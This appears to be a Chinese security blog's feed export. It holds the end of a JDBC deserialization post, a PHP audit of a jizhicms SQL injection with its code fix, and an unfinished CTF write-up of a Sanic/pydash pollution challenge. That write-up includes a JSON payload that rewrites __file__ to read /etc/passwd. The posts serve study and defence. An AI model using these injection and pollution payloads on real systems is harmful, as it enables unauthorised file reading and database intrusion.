href="#数据段4" class="headerlink" title="数据段4"></a>数据段4</h4><p>数据字段4就是POC了。POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）</p><p>最终poc直接拿大佬的来用了</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>改一下配置文件直接使用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820150150852.png" alt="image-20240820150150852"></p><p>值得注意的是这里居然还有任意文件读取, 这部分内容直接参考</p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JDBC基础&quot;&gt;&lt;a href=&quot;#JDBC基础&quot; class=&quot;headerlink&quot; title=&quot;JDBC基础&quot;&gt;&lt;/a&gt;JDBC基础&lt;/h2&gt;&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liaoxuefeng.com/books/java/</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="JDBC反序列化" scheme="http://example.com/tags/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计之CMS漏洞初探</title>
    <link href="http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/</id>
    <published>2024-08-01T15:32:50.000Z</published>
    <updated>2024-08-20T07:29:37.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP代码审计之CMS漏洞初探"><a href="#PHP代码审计之CMS漏洞初探" class="headerlink" title="PHP代码审计之CMS漏洞初探"></a>PHP代码审计之CMS漏洞初探</h1><p>Java代码实在难懂, 索性先暂时放一放, 最近心血来潮想提升一下php代码审计的能力, (真的很想体验一下真实的挖漏洞)</p><p>话不多说我们随便找几个cms已经公布的漏洞来练练手</p><h2 id="jizhicms-v2-3-3-sql注入"><a href="#jizhicms-v2-3-3-sql注入" class="headerlink" title="jizhicms v2.3.3 sql注入"></a>jizhicms v2.3.3 sql注入</h2><p>这个2.3.3版本下载不到但是能下到2.3.2</p><p><a href="https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2">https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2</a></p><p>搭建好环境开干</p><p>我测试了一下也是存在这个漏洞的</p><p>首先漏洞的点在这个位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admins/Member/memberedit.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>jizhicms</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>234</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://jizhicms</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://jizhicms/index.php/admins/Member/memberedit/id/2.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=apkas20el5jn5o9070b1gj3176</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">go</span>=<span class="number">1</span>&amp;id=<span class="number">1</span>&amp;username=aaa&amp;openid=rtr&amp;sex=<span class="number">0</span>&amp;gid=<span class="number">0</span>&amp;litpic=&amp;file=&amp;tel=&amp;jifen=<span class="number">0</span>.<span class="number">00</span>&amp;money=<span class="number">0</span>.<span class="number">00</span>&amp;email=&amp;province=&amp;city=&amp;address=&amp;regtime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;logintime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;signature=&amp;birthday=&amp;pid=<span class="number">0</span>&amp;isshow=<span class="number">1</span>&amp;pass=&amp;repass=</span></span><br></pre></td></tr></table></figure><p>id参数存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240801234103555.png" alt="image-20240801234103555"></p><p>那么就去代码中看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802003811944.png" alt="image-20240802003811944"></p><p>不难定位到这个逻辑实现的位置</p><p>从源码来看这个cms是一个MVC架构,</p><p>我们主要去看update方法</p><p>调试一下很容易就能定位到</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802004056234.png" alt="image-20240802004056234"></p><p>这段代码是没有过滤的, 有可能存在过滤的位置也就是<code>__prepera_format</code>和<code>runSql</code>这两个方法</p><p>我们先去调试<code>__prepera_format</code>这个方法</p><p>不难看出这里是有问题的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122153511.png" alt="image-20240802122153511"></p><p>这里的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本意应该是通过<code>jz_member</code>的结构来格式化我们查询的内容, 而在<code>jz_member</code>表中<code>id</code>字段应该是<code>int(11)</code>这里虽然正确判断出了id字段为int型, 但是在处理数据时并没有把我们传入的id强转为数字型而是直接进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122628190.png" alt="image-20240802122628190"></p><p>可以看见id字段仍然是字符串</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123335763.png" alt="image-20240802123335763"></p><p>同样的问题, <code>$condition</code>也就是传入的id字段的内容,直接被拼接到了where语句后</p><p>我们去跟进<code>runSql</code>也是看不见任何的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123538306.png" alt="image-20240802123538306"></p><p>由此造成了sql注入</p><p>那么我们简单修复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__prepera_format</span>(<span class="params"><span class="variable">$rows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getTable</span>(<span class="variable">$table</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();  </span><br><span class="line"><span class="variable">$columns</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_CLASS</span>);</span><br><span class="line"><span class="variable">$newcol</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$columns</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$field</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>-&gt;Field);</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0.0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span> )&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newcol</span>;</span><br><span class="line"><span class="comment">//return array_intersect_key($rows,$newcol);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802125221708.png" alt="image-20240802125221708"></p><p>可以看见此时sqlmap已经跑不出来了</p><p>实际上在2.3.2版本是有全局字符串过滤的, 但是并没有包含对id的过滤</p><p>官方的修复手法简单粗暴, 在<code>get_fields_data</code>函数中加上了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">format_param</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这里的format_param函数将id强转为int</p><p><a href="https://www.yijinglab.com/specialized/20230308140107">https://www.yijinglab.com/specialized/20230308140107</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;a href=&quot;#PHP代码审计之CMS漏洞初探&quot; class=&quot;headerlink&quot; title=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;/a&gt;PHP代码审计之CMS漏洞初探&lt;/h1&gt;&lt;p&gt;Java代码实在难懂, 索性先暂时放</summary>
      
    
    
    
    
    <category term="PHP代码设计" scheme="http://example.com/tags/PHP%E4%BB%A3%E7%A0%81%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从Sanic到Sanic&#39;s revenge</title>
    <link href="http://example.com/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/"/>
    <id>http://example.com/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/</id>
    <published>2024-07-27T09:35:21.000Z</published>
    <updated>2024-07-29T16:23:38.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从Sanic到Sanic’s-revenge"><a href="#从Sanic到Sanic’s-revenge" class="headerlink" title="从Sanic到Sanic’s revenge"></a>从Sanic到Sanic’s revenge</h1><h2 id="Sanic"><a href="#Sanic" class="headerlink" title="Sanic"></a>Sanic</h2><p>首先是国赛中的一道名为Sanic的题目</p><p>参考gxn师傅的题解</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>首先访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在<code>/admin</code>处存在污染(pydash&#x3D;&#x3D;5.1.2), 不过我们需要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>所以要先完成<code>/login</code>里的登录操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br></pre></td></tr></table></figure><p>但在cookie中<code>;</code>是分割符号</p><p>sanic在处理 Cookie时, 对八进制是有转换的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728171506324.png" alt="image-20240728171506324"></p><p>因此这里可以使用八进制绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727175702072.png" alt="image-20240727175702072"></p><p>接下来就是污染<code>__file__</code>这个全局变量, 他在<code>/src</code>路由下被使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p><code>_.</code>被ban了, 这里需要看一下pydash的源码, 我们跟进<code>_set</code>方法一直到<code>update_with</code>, 这里时真正进行merge的地方</p><p>选中参数path往下翻会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172719311.png" alt="image-20240728172719311"></p><p><code>to_path_tokens</code>对path进行了解析, 我们跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172917613.png" alt="image-20240728172917613"></p><p>有一个名为<code>RE_PATH_KEY_DELIM</code>的正则对其进行了过滤</p><p>点进去, 这个正则是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>大概意思是 用偶数个<code>/</code>加上<code>.</code>来分割字符串, 并且匹配<code>[数字]</code></p><p>理论上来说我们加上<code>\\</code>就可以, 但是这里调试了半天, <code>\\</code>并不会被忽略导致第一个key和第二个连在一起了,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213148221.png" alt="image-20240728213148221"></p><p> 我们单把这个正则从推导式中拿出来又能正确分割</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213402968.png" alt="image-20240728213402968"></p><p>感觉这里是推导式的锅, 我们还是老实用大佬的poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__\\\\.__globals__</span><br></pre></td></tr></table></figure><p>这样我们就可以读取任意文件了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p>但是flag的位置不得而知,  正常思路我们需要再找到一个能够遍历目录的点</p><p>大概扫一眼, 也就这个位置和目录有点关系了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure><p>这里的app.static创建了一个静态文件路由<code>/static/</code>使得客户端能够访问到.&#x2F;static&#x2F;路径下的静态文件</p><p>我们去方法里面看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221812455.png" alt="image-20240727221812455"></p><p>可以看见这个方法中有很多的参数, 下面还有一大段的注释</p><p>重点关注directory_view 和 directory_handler这两个参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221932012.png" alt="image-20240727221932012"></p><p>directory_view 理解起来比较简单, 当它为True时, 访问对应路由时会展示目录下的文件及子目录</p><p>例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>, directory_view=<span class="literal">True</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223020832.png" alt="image-20240727223020832"></p><p>正常不加参数directory_view&#x3D;True这里是会返回500错误的</p><p>而directory_handler是一个对象, 它负责处理客户端对目录的请求, 题目中是没有指定directory_handler的, 在app.static方法中, 没有指定directory_handler时, 默认会这样处理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223438442.png" alt="image-20240727223438442"></p><p>这里创建了一个Directory_handler, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223806677.png" alt="image-20240727223806677"></p><p>这样看来我们只需要把static创建的这个Directory_handler对象的directory污染为根目录, directory_view污染为True即可</p><p>如何获取到Directory_handler对象?</p><p>首先需要明确一点, 一条路由的handler, 肯定是存在于这个路由的实例的上下文中的, 那么我们首先要得到这个路由的实例</p><p>这里有两种方法来获取全部路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index</span><br><span class="line">输出:</span><br><span class="line">&#123;&#x27;__mp_main__.static&#x27;: &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;, &#x27;__mp_main__.index&#x27;: &lt;Route: name=__mp_main__.index path=/&gt;, &#x27;__mp_main__.login&#x27;: &lt;Route: name=__mp_main__.login path=login&gt;, &#x27;__mp_main__.src&#x27;: &lt;Route: name=__mp_main__.src path=src&gt;, &#x27;__mp_main__.admin&#x27;: &lt;Route: name=__mp_main__.admin 